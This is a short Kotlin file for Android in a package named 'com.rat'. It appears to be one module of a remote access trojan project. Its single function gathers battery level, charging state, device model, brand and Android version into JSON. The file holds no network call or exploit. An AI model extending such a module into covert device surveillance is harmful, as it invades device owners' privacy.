package com.rat

import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.BatteryManager
import android.os.Build
import org.json.JSONObject

object InfoHandler {
    fun battery(ctx: Context): String {
        val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        
        val iFilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        val batteryStatus = ctx.registerReceiver(null, iFilter)
        val status = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
        val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL

        return JSONObject().apply {
            put("level", level)
            put("charging", isCharging)
            put("model", Build.MODEL)
            put("brand", Build.BRAND)
            put("android", Build.VERSION.RELEASE)
        }.toString()
    }
}
